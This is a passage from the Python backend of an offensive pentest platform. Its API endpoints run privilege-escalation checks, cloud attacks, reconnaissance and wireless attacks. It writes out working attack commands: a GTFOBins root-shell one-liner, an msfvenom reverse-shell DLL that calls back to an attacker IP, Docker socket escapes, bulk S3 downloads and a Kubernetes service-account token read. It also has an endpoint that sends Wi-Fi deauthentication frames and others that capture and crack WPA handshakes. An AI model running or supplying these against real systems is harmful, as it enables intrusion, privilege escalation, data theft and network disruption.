        "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'",
    }
    findings = []
    suid_bins = []
    for line in out.splitlines():
        if line.strip():
            parts = line.split()
            if parts:
                binary = parts[-1]
                name = binary.split("/")[-1]
                exploit_cmd = gtfobins.get(name, "")
                entry = {"binary": binary, "name": name, "exploit": exploit_cmd,
                    "gtfobins_url": f"https://gtfobins.github.io/gtfobins/{name}/"}
                suid_bins.append(entry)
                if exploit_cmd:
                    findings.append({"detail": f"SUID GTFOBin: {binary}\n  Exploit: {exploit_cmd}",
                        "severity": "CRITICAL", "cvss": "9.3", "cve": "N/A",
                        "cwe": "CWE-269", "cwe_name": "SUID Exploitation",
                        "owasp": "A01:2021", "remediation": f"chmod u-s {binary}"})
    if not findings:
        findings.append({"detail": f"Found {len(suid_bins)} SUID binaries — none are known GTFOBins",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "SUID Check",
            "owasp": "A01:2021", "remediation": "Review all SUID binaries for custom exploits."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "suid", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "suid_finder",
            "suid_binaries": suid_bins, "exploitable": [b for b in suid_bins if b["exploit"]],
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/formatstring")
async def exploit_formatstring(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    target_url = req.target if req.target.startswith("http") else "http://" + req.target
    payloads = ["%s%s%s%s", "%x%x%x%x", "%p%p%p%p", "%n", "AAAA%x%x%x%x", "%08x.%08x.%08x"]
    params = ["q","search","name","input","data","msg","text","value","param","field"]
    for payload in payloads[:3]:
        for param in params[:5]:
            try:
                r = _req_lib.get(target_url, params={param: payload}, timeout=5, verify=False)
                if ("0x" in r.text or re.search(r"\b[0-9a-f]{8}\b", r.text) or
                        payload.replace("%s","").replace("%x","").replace("%p","") != payload and len(r.text) > 100):
                    if "%s%s" in payload and "error" in r.text.lower():
                        findings.append({"detail": f"Format string indicator: ?{param}={payload} caused error response",
                            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                            "cwe": "CWE-134", "cwe_name": "Format String",
                            "owasp": "A03:2021", "remediation": "Never pass user input to printf/sprintf without format specifier."})
                        break
            except Exception:
                pass
    if not findings:
        findings.append({"detail": "No format string vulnerability detected in web parameters",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-134", "cwe_name": "Format String",
            "owasp": "A03:2021", "remediation": "Format string bugs are typically in compiled binaries — use binary analysis tools."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "formatstring", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "formatstring",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/dllhijack")
async def exploit_dllhijack(req: PrivEscRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    findings = []
    if host:
        nmap_result = await run_tool(["nmap", "-sV", "-p", "135,139,445,3389", host, "-T4"], timeout=30)
        nmap_out = nmap_result.get("output", "")
        if "Windows" in nmap_out or "microsoft" in nmap_out.lower():
            findings.append({"detail": "Windows target confirmed — DLL hijacking applicable",
                "severity": "HIGH", "cvss": "7.8", "cve": "N/A",
                "cwe": "CWE-426", "cwe_name": "DLL Hijacking",
                "owasp": "A06:2021", "remediation": "Set DLL search order correctly. Use absolute paths in LoadLibrary calls."})
    commands = {
        "find_writable_dirs": "icacls \"C:\\Program Files\" /T 2>nul | findstr /i \"(F) (M) (W)\"",
        "find_missing_dlls": "procmon.exe  # Filter: Result=NAME NOT FOUND, Path ends with .dll",
        "generate_dll": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={req.lhost or 'KALI_IP'} LPORT={req.lport} -f dll -o malicious.dll",
        "check_path_order": "echo %PATH%  # Check for writable dirs early in PATH",
        "weak_service_perms": "accesschk.exe -uwcqv * 2>nul  # Find services with weak permissions",
        "winpeas_dll": "winpeas.exe  # Checks for DLL hijacking opportunities automatically",
    }
    if not findings:
        findings.append({"detail": "DLL hijacking analysis — requires Windows target with shell access",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-426", "cwe_name": "DLL Hijacking",
            "owasp": "A06:2021", "remediation": "Use code signing. Set proper ACLs on DLL directories."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dllhijack", req.target, {"output": str(commands)})
    return {"scan_id": scan_id, "target": req.target, "tool": "dll_hijack",
            "findings": findings, "total": len(findings),
            "commands": commands, "timestamp": datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  PROMPT 5 — CLOUD ATTACKS
# ══════════════════════════════════════════════════════════════

@app.post("/api/cloud/s3")
async def cloud_s3(req: CloudRequest, user=Depends(verify_token)):
    findings = []
    target = req.bucket or _recon_host(req.target) if req.target else req.bucket
    if not target:
        return {"error": "Bucket name or target required"}
    # Test public access
    s3_urls = [
        f"https://{target}.s3.amazonaws.com/",
        f"https://{target}.s3.{req.region}.amazonaws.com/",
        f"https://s3.amazonaws.com/{target}/",
    ]
    bucket_findings = []
    for url in s3_urls:
        try:
            r = _req_lib.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                if "<ListBucketResult" in r.text or "Key>" in r.text:
                    files = re.findall(r"<Key>([^<]+)</Key>", r.text)
                    findings.append({"detail": f"S3 bucket publicly accessible: {url} — {len(files)} files listed",
                        "severity": "CRITICAL", "cvss": "9.1", "cve": "N/A",
                        "cwe": "CWE-732", "cwe_name": "S3 Public Bucket",
                        "owasp": "A01:2021", "remediation": "Enable S3 Block Public Access. Apply bucket policy to deny public GetObject."})
                    bucket_findings.extend(files[:10])
            elif r.status_code == 403:
                findings.append({"detail": f"S3 bucket exists but access denied: {url}",
                    "severity": "LOW", "cvss": "3.1", "cve": "N/A",
                    "cwe": "CWE-732", "cwe_name": "S3 Bucket Enumeration",
                    "owasp": "A01:2021", "remediation": "Bucket exists — verify it contains no sensitive data."})
        except Exception:
            pass
    if not findings:
        findings.append({"detail": f"S3 bucket '{target}' not publicly accessible or does not exist",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-732", "cwe_name": "S3 Bucket Check",
            "owasp": "A01:2021", "remediation": "Always enable S3 Block Public Access at account level."})
    # AWS CLI commands
    commands = {
        "list_bucket": f"aws s3 ls s3://{target}/ --no-sign-request",
        "download_all": f"aws s3 cp s3://{target}/ /tmp/s3dump/ --recursive --no-sign-request",
        "check_acl": f"aws s3api get-bucket-acl --bucket {target}",
        "check_policy": f"aws s3api get-bucket-policy --bucket {target}",
        "enumerate_buckets": "aws s3 ls  # List all buckets if credentials available",
    }
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "s3_scan", target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": target, "tool": "s3_scanner",
            "bucket": target, "files_found": bucket_findings,
            "findings": findings, "total": len(findings),
            "commands": commands, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/cloud/iam")
async def cloud_iam(req: CloudRequest, user=Depends(verify_token)):
    findings = []
    commands = {
        "whoami": "aws sts get-caller-identity",
        "list_users": "aws iam list-users",
        "list_roles": "aws iam list-roles",
        "list_policies": "aws iam list-attached-user-policies --user-name USERNAME",
        "admin_check": "aws iam get-user-policy --user-name USERNAME --policy-name POLICY",
        "enum_permissions": "aws iam simulate-principal-policy --policy-source-arn ARN --action-names '*'",
        "access_advisor": "aws iam generate-service-last-accessed-details --arn ARN",
        "find_admin": "aws iam list-users | jq '.Users[].UserName' | xargs -I{} aws iam list-attached-user-policies --user-name {}",
        "pacu_enum": "python3 pacu.py  # Use Pacu framework for automated IAM enumeration",
    }
    # Check for exposed AWS keys in environment
    aws_key_env = os.environ.get("AWS_ACCESS_KEY_ID", "")
    if aws_key_env:
        findings.append({"detail": "AWS_ACCESS_KEY_ID found in environment — validate permissions",
            "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
            "cwe": "CWE-798", "cwe_name": "Hardcoded Credentials",
            "owasp": "A07:2021", "remediation": "Use IAM roles instead of long-term access keys. Rotate keys regularly."})
    # Check for AWS config files
    aws_cred_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_cred_path):
        findings.append({"detail": f"AWS credentials file found at {aws_cred_path}",
            "severity": "MEDIUM", "cvss": "5.5", "cve": "N/A",
            "cwe": "CWE-522", "cwe_name": "Exposed Credentials",
            "owasp": "A07:2021", "remediation": "Use IAM instance roles. Never store long-term keys on disk."})
    if not findings:
        findings.append({"detail": "No AWS credentials found locally — provide Access Key/Secret for IAM enumeration",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-285", "cwe_name": "IAM Check",
            "owasp": "A01:2021", "remediation": "Apply least privilege IAM policies. Enable AWS Config and CloudTrail."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "iam_check", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "aws_iam",
            "findings": findings, "total": len(findings),
            "commands": commands, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/cloud/docker")
async def cloud_docker(req: CloudRequest, user=Depends(verify_token)):
    findings = []
    # Check Docker socket
    docker_result = await run_tool(["docker", "info", "--format", "json"], timeout=15)
    docker_out = docker_result.get("output", "")
    has_docker = "ServerVersion" in docker_out or "server" in docker_out.lower()
    if has_docker:
        findings.append({"detail": "Docker daemon accessible — check for socket exposure and privileged containers",
            "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "Docker Daemon Access",
            "owasp": "A05:2021", "remediation": "Restrict Docker socket access. Run containers as non-root."})
        # List containers
        ps_result = await run_tool(["docker", "ps", "--format", "{{.Names}}\t{{.Image}}\t{{.Status}}"], timeout=10)
        containers = [l for l in ps_result.get("output","").splitlines() if l.strip()]
        # Check for privileged containers
        for c in containers[:5]:
            insp_result = await run_tool(["docker", "inspect", c.split()[0] if c.split() else ""], timeout=10)
            insp_out = insp_result.get("output", "")
            if '"Privileged": true' in insp_out:
                findings.append({"detail": f"PRIVILEGED container detected: {c.split()[0]} — container escape possible",
                    "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                    "cwe": "CWE-269", "cwe_name": "Container Escape",
                    "owasp": "A05:2021", "remediation": "Never run containers with --privileged. Use security profiles."})
    # Check for docker.sock mount
    sock_result = await run_tool(["ls", "-la", "/var/run/docker.sock"], timeout=5)
    sock_out = sock_result.get("output", "")
    if "srw" in sock_out or "docker.sock" in sock_out:
        findings.append({"detail": "Docker socket /var/run/docker.sock accessible — potential root escape",
            "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "Docker Socket Escape",
            "owasp": "A05:2021",
            "remediation": "Never mount Docker socket in containers. Use rootless Docker."})
    if not findings:
        findings.append({"detail": "Docker not accessible or not running on this host",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "Docker Check",
            "owasp": "A05:2021", "remediation": "Run Docker with user namespaces and Seccomp profiles."})
    escape_cmds = {
        "via_socket": "docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host",
        "via_privileged": "mount /dev/sda1 /mnt && chroot /mnt",
        "via_capabilities": "capsh --print  # Check dangerous capabilities",
        "check_cgroups": "cat /proc/1/cgroup  # Check if inside container",
        "check_env": "env | grep -i docker  # Container environment variables",
    }
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "docker_check", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "docker_inspector",
            "docker_available": has_docker, "findings": findings, "total": len(findings),
            "escape_commands": escape_cmds, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/cloud/k8s")
async def cloud_k8s(req: CloudRequest, user=Depends(verify_token)):
    findings = []
    # Check kubectl availability
    kubectl_result = await run_tool(["which", "kubectl"], timeout=5)
    has_kubectl = bool(kubectl_result.get("output","").strip())
    # Check for K8s service account token
    sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    in_k8s = os.path.exists(sa_token_path)
    if in_k8s:
        findings.append({"detail": "Running inside a Kubernetes pod — service account token available",
            "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "K8s Service Account",
            "owasp": "A01:2021", "remediation": "Use least-privilege service accounts. Mount tokens read-only."})
        # Try to access K8s API
        api_result = await run_tool(
            ["curl", "-sk", "--cacert", "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
             "-H", f"Authorization: Bearer $(cat {sa_token_path})",
             "https://kubernetes.default.svc/api/v1/namespaces"], timeout=10)
        api_out = api_result.get("output", "")
        if "items" in api_out or "namespaces" in api_out.lower():
            findings.append({"detail": "K8s API accessible with service account — can enumerate namespaces",
                "severity": "CRITICAL", "cvss": "9.0", "cve": "N/A",
                "cwe": "CWE-269", "cwe_name": "K8s API Access",
                "owasp": "A01:2021", "remediation": "Apply RBAC. Disable automounting of service account tokens."})
    # Check for exposed K8s API server on target
    if req.target:
        host = _recon_host(req.target)
        api_check = await run_tool(["curl", "-sk", "--max-time", "5", f"https://{host}:6443/api"], timeout=10)
        api_out = api_check.get("output", "")
        if '"apiVersion"' in api_out or "k8s" in api_out.lower():
            findings.append({"detail": f"K8s API server exposed at {host}:6443 — attempt anonymous access",
                "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                "cwe": "CWE-306", "cwe_name": "Exposed K8s API",
                "owasp": "A01:2021", "remediation": "Restrict API server access. Disable anonymous auth."})
    if not findings:
        findings.append({"detail": "No Kubernetes environment detected — not running in a pod",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "K8s Check",
            "owasp": "A01:2021", "remediation": "Apply K8s CIS Benchmark. Use PodSecurityStandards."})
    commands = {
        "enum_all": "kubectl get all --all-namespaces",
        "find_secrets": "kubectl get secrets --all-namespaces",
        "check_rbac": "kubectl auth can-i --list",
        "get_pods": "kubectl get pods --all-namespaces -o wide",
        "exec_pod": "kubectl exec -it PODNAME -- /bin/bash",
        "port_forward": "kubectl port-forward svc/SERVICE LOCAL:REMOTE",
    }
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "k8s_check", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "kubectl",
            "in_kubernetes": in_k8s, "kubectl_available": has_kubectl,
            "findings": findings, "total": len(findings),
            "commands": commands, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/cloud/apiabusecheck")
async def cloud_api_abuse(req: CloudRequest, user=Depends(verify_token)):
    target_url = req.target if req.target.startswith("http") else "http://" + req.target
    findings = []
    # Rate limit check
    responses = []
    for i in range(20):
        try:
            r = _req_lib.get(target_url, timeout=3, verify=False)
            responses.append(r.status_code)
        except Exception:
            responses.append(0)
    status_codes = set(responses)
    if 429 not in status_codes and len([r for r in responses if r == 200]) > 15:
        findings.append({"detail": "No rate limiting detected — 20 rapid requests all succeeded",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-770", "cwe_name": "No Rate Limiting",
            "owasp": "A04:2021", "remediation": "Implement rate limiting (e.g. 100 req/min per IP). Return 429 on excess."})
    # Check for API keys in headers/response
    try:
        r = _req_lib.get(target_url, timeout=10, verify=False)
        resp_headers = str(r.headers).lower()
        if any(k in resp_headers for k in ["x-api-key","api-key","authorization","x-auth-token"]):
            findings.append({"detail": "API authentication headers present — verify tokens are not exposed",
                "severity": "MEDIUM", "cvss": "5.3", "cve": "N/A",
                "cwe": "CWE-200", "cwe_name": "API Auth Exposure",
                "owasp": "A02:2021", "remediation": "Rotate API keys. Use short-lived tokens."})
        # Check for API docs exposure
        for doc_path in ["/api/docs", "/swagger", "/swagger-ui", "/api-docs", "/openapi.json", "/graphql"]:
            doc_r = _req_lib.get(target_url.rstrip("/") + doc_path, timeout=5, verify=False)
            if doc_r.status_code == 200 and len(doc_r.text) > 200:
                findings.append({"detail": f"API documentation exposed at {doc_path} — endpoints visible to attackers",
                    "severity": "MEDIUM", "cvss": "5.3", "cve": "N/A",
                    "cwe": "CWE-200", "cwe_name": "API Doc Exposure",
                    "owasp": "A02:2021", "remediation": "Restrict API docs to authenticated users only."})
    except Exception:
        pass
    if not findings:
        findings.append({"detail": "API appears to have rate limiting in place or returned non-200 responses",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-770", "cwe_name": "API Abuse Check",
            "owasp": "A04:2021", "remediation": "Continue testing authenticated API endpoints."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "api_abuse", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "api_abuse_checker",
            "status_distribution": {str(k): responses.count(k) for k in set(responses)},
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}



# ══════════════════════════════════════════════════════════════
#  MISSING RECON ENDPOINTS
# ══════════════════════════════════════════════════════════════

def _parse_nmap_ports(output: str) -> list:
    ports = []
    current = None
    for line in output.splitlines():
        m = re.match(r"(\d+)/(\w+)\s+(\w+)\s+(\S+)\s*(.*)", line)
        if m:
            current = {"port": int(m.group(1)), "protocol": m.group(2),
                "state": m.group(3), "service": m.group(4),
                "version": m.group(5).strip(), "scripts": []}
            ports.append(current)
        elif current and re.match(r"\|[_\s]", line):
            script_line = re.sub(r"^\|[_\s]*", "", line).strip()
            if script_line:
                current["scripts"].append(script_line)
    return ports


@app.post("/api/recon/dnsrecon")
async def recon_dnsrecon(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    out_file = f"/tmp/dnsrecon_{uuid.uuid4().hex}.json"
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std", "-j", out_file], timeout=60)
    records = []
    try:
        with open(out_file) as f:
            data = json.load(f)
        for rec in data:
            if isinstance(rec, dict) and rec.get("type") not in ("info",):
                records.append({"type": rec.get("type",""), "name": rec.get("name", rec.get("target","")),
                    "address": rec.get("address", rec.get("strings", rec.get("exchange","")))})
    except Exception:
        for line in result.get("output","").splitlines():
            m = re.match(r"\s*\[\*\]\s+(\w+)\s+(\S+)\s+(.*)", line)
            if m: records.append({"type": m.group(1), "name": m.group(2), "address": m.group(3).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "domain": host,
            "records": records, "total": len(records),
            "raw_output": result.get("output",""), "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/recon/harvester")
async def recon_harvester(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(
        ["theHarvester", "-d", host, "-b", "bing,crtsh,dnsdumpster,hackertarget", "-l", "100"], timeout=120)
    out = result.get("output","")
    emails = list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
    hosts  = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
    emails = [e for e in emails if "edge-security.com" not in e.lower()]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "harvester", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "domain": host,
            "emails": emails[:50], "hosts": hosts[:50], "total": len(emails)+len(hosts),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/recon/services")
async def recon_services(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "-sC", "-T4", "--open", host], timeout=180)
    ports = _parse_nmap_ports(result.get("output",""))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "services", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "host": host,
            "ports": ports, "total": len(ports),
            "raw_output": result.get("output",""), "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/recon/os")
async def recon_os(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-O", "--osscan-guess", "-T4", host], timeout=120)
    out = result.get("output","")
    os_name, accuracy, matches = None, None, []
    for line in out.splitlines():
        m = re.match(r"OS details:\s*(.+)", line)
        if m: os_name = m.group(1).strip()
        m2 = re.match(r"Aggressive OS guesses:\s*(.+)", line)
        if m2:
            for item in m2.group(1).split(","):
                item = item.strip()
                acc = re.search(r"\((\d+)%\)", item)
                name = re.sub(r"\s*\(\d+%\)","",item).strip()
                matches.append({"name": name, "accuracy": int(acc.group(1)) if acc else 0})
            if matches and not os_name:
                os_name = matches[0]["name"]; accuracy = matches[0]["accuracy"]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "os", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "host": host,
            "os": os_name, "accuracy": accuracy, "matches": matches[:5],
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/recon/banner")
async def recon_banner(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "--script", "banner", "-T4", "--open", host], timeout=120)
    out = result.get("output","")
    banners = {}
    current_port = None
    for line in out.splitlines():
        pm = re.match(r"(\d+)/tcp\s+open", line)
        if pm: current_port = pm.group(1)
        bm = re.match(r"\|[_ ]\s*banner:\s*(.+)", line, re.IGNORECASE)
        if bm and current_port: banners[current_port] = bm.group(1).strip()
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "banner", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "host": host,
            "banners": banners, "total": len(banners),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/recon/crtsh")
async def recon_crtsh(req: ScanRequest, user=Depends(verify_token)):
    import urllib.request, ssl as _ssl2
    host = _recon_host(req.target)
    subdomains = []
    raw_output = ""
    try:
        url = f"https://crt.sh/?q=%25.{host}&output=json"
        ctx = _ssl2.create_default_context()
        with urllib.request.urlopen(url, context=ctx, timeout=30) as resp:
            data = json.loads(resp.read().decode())
        seen = set()
        for entry in data:
            for sub in entry.get("name_value","").splitlines():
                sub = sub.strip().lstrip("*.")
                if sub and host in sub and sub not in seen:
                    seen.add(sub); subdomains.append(sub)
        raw_output = f"Found {len(subdomains)} subdomains via crt.sh"
    except Exception as e:
        raw_output = f"crt.sh error: {e}"
    subdomains = sorted(set(subdomains))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "crtsh", req.target, {"output": raw_output})
    return {"scan_id": scan_id, "target": req.target, "domain": host,
            "subdomains": subdomains, "total": len(subdomains),
            "raw_output": raw_output, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/recon/amass")
async def recon_amass(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    out_file = f"/tmp/amass_{uuid.uuid4().hex}.txt"
    result = await run_tool(["amass", "enum", "-passive", "-d", host, "-o", out_file], timeout=180)
    subdomains = []
    try:
        with open(out_file) as f:
            subdomains = [l.strip() for l in f if l.strip()]
    except Exception:
        for line in result.get("output","").splitlines():
            line = line.strip()
            if host in line and " " not in line: subdomains.append(line)
    subdomains = sorted(set(subdomains))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "amass", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "domain": host,
            "subdomains": subdomains, "total": len(subdomains),
            "raw_output": result.get("output",""), "timestamp": datetime.datetime.utcnow().isoformat()}


class ShodanRequest(BaseModel):
    target:  str
    api_key: str = ""
    options: Optional[dict] = None

@app.post("/api/recon/shodan")
async def recon_shodan(req: ShodanRequest, user=Depends(verify_token)):
    import socket as _sock2, urllib.request as _ureq2, ssl as _ssl3
    host = _recon_host(req.target)
    api_key = req.api_key.strip()
    if not api_key:
        return {"scan_id": str(uuid.uuid4()), "target": req.target, "host": host,
                "error": "No Shodan API key — enter it in the Shodan Lookup field",
                "raw_output": "", "timestamp": datetime.datetime.utcnow().isoformat()}
    raw_output = ""
    result_data = {}
    try:
        ip = _sock2.gethostbyname(host)
        ctx = _ssl3.create_default_context()
        url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
        with _ureq2.urlopen(url, context=ctx, timeout=20) as resp:
            data = json.loads(resp.read().decode())
        ports  = [item.get("port") for item in data.get("data",[]) if item.get("port")]
        vulns  = list(data.get("vulns",{}).keys())
        result_data = {"ip": ip, "ports": sorted(set(ports)), "vulns": vulns,
            "hostnames": data.get("hostnames",[]), "org": data.get("org",""),
            "isp": data.get("isp",""), "country": data.get("country_name",""),
            "city": data.get("city",""), "os": data.get("os",""),
            "services": [{"port": i.get("port"), "product": i.get("product",""),
                "version": i.get("version",""), "banner": (i.get("data","") or "")[:200]}
                for i in data.get("data",[])[:20]]}
        raw_output = f"Shodan: {ip} — {len(ports)} ports, {len(vulns)} CVEs"
    except Exception as e:
        raw_output = f"Shodan error: {e}"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "shodan", req.target, {"output": raw_output})
    return {"scan_id": scan_id, "target": req.target, "host": host,
            "raw_output": raw_output, "timestamp": datetime.datetime.utcnow().isoformat(), **result_data}


# ══════════════════════════════════════════════════════════════
#  REMAINING MODULES — BACKEND ENDPOINTS
# ══════════════════════════════════════════════════════════════

import uuid as _uuid

# ─────────────────────────────────────────────────────────────
# WIRELESS ATTACKS
# ─────────────────────────────────────────────────────────────

@app.post("/api/wireless/interfaces")
async def wireless_interfaces(token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(["iwconfig"], timeout=10)
    if result.get("error","") and "not found" in result.get("error",""):
        result = await run_tool(["ip", "link", "show"], timeout=10)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        if "wlan" in line.lower() or "wlp" in line.lower() or "mon" in line.lower():
            findings.append({"severity": "INFO", "title": "Wireless Interface", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No wireless interfaces found", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": "localhost", "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} interface(s) detected"}


@app.post("/api/wireless/scan")
async def wireless_scan(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    iface = (req.options or {}).get("iface", req.target)
    out_file = f"/tmp/airodump_{scan_id}"
    result = await run_tool(
        ["airodump-ng", iface, "--write-interval", "1", "--output-format", "csv", "-w", out_file],
        timeout=15
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        parts = line.split(",")
        if len(parts) >= 9 and len(parts[0].strip()) == 17:
            bssid = parts[0].strip()
            signal = parts[8].strip() if len(parts) > 8 else "N/A"
            enc = parts[5].strip() if len(parts) > 5 else "N/A"
            ssid = parts[13].strip() if len(parts) > 13 else "Unknown"
            channel = parts[3].strip() if len(parts) > 3 else "?"
            sev = "HIGH" if "WEP" in enc else ("MEDIUM" if "WPA" in enc else "INFO")
            findings.append({"severity": sev, "title": f"Network: {ssid}",
                             "detail": f"BSSID={bssid} CH={channel} ENC={enc} Signal={signal}"})
    if not findings:
        findings.append({"severity": "INFO", "title": "Scan completed", "detail": raw[:500]})
    return {"scan_id": scan_id, "target": iface, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} network(s) found"}


@app.post("/api/wireless/deauth")
async def wireless_deauth(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    bssid = opts.get("bssid", "00:11:22:33:44:55")
    iface = opts.get("iface", req.target)
    result = await run_tool(["aireplay-ng", "--deauth", "5", "-a", bssid, iface], timeout=20)
    raw = result["output"] + result.get("error","")
    sent = sum(1 for l in raw.splitlines() if "sent" in l.lower() or "deauth" in l.lower())
    sev = "HIGH" if sent > 0 else "MEDIUM"
    findings = [{"severity": sev, "title": "Deauthentication Attack",
                 "detail": f"Sent deauth frames to BSSID {bssid} on {iface}. Lines matched: {sent}"}]
    return {"scan_id": scan_id, "target": bssid, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Deauth frames sent"}


@app.post("/api/wireless/wifite")
async def wireless_wifite(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    iface = (req.options or {}).get("iface", req.target)
    result = await run_tool(["wifite", "--interface", iface, "--kill", "--no-wps", "-v"], timeout=60)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        if "cracked" in line.lower():
            findings.append({"severity": "CRITICAL", "title": "Handshake Cracked", "detail": line.strip()})
        elif "handshake" in line.lower():
            findings.append({"severity": "HIGH", "title": "Handshake Captured", "detail": line.strip()})
        elif "target" in line.lower():
            findings.append({"severity": "MEDIUM", "title": "Target Identified", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Wifite run complete", "detail": raw[:500]})
    return {"scan_id": scan_id, "target": iface, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} event(s) detected"}


@app.post("/api/wireless/crack")
async def wireless_crack(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    capfile = opts.get("capfile", req.target)
    wordlist = opts.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    result = await run_tool(["aircrack-ng", capfile, "-w", wordlist], timeout=120)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        if "key found" in line.lower():
